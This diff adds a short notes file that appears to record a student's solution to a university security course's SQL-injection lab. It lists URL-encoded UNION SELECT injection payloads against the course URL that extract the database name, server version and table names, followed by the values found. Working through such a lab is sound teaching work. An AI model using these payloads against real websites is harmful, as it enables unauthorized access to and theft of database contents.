@@ -1,0 +1,14 @@
+Database Name:
+http://courses.cs.vt.edu/cs4264/project3/sqlinject3/?id=%27+UNION+ALL+SELECT+NULL%2C%28SELECT+DATABASE%28%29%29%2CNULL%23
+
+Version:
+http://courses.cs.vt.edu/cs4264/project3/sqlinject3/?id=%27+UNION+ALL+SELECT+NULL%2C%40%40version%2CNULL%23
+
+Tables:
+CHARACTER_SET
+http://courses.cs.vt.edu/cs4264/project3/sqlinject3/?id=%27+UNION+SELECT+table_schema%2C+table_name%2C+1+FROM+information_schema.tables%23
+
+Name: cs4264_project3_xtra_cr3dit
+Version: 5.5.59-MariaDB-wsrep
+Tables: CHARACTER_SET,
+Secret: 
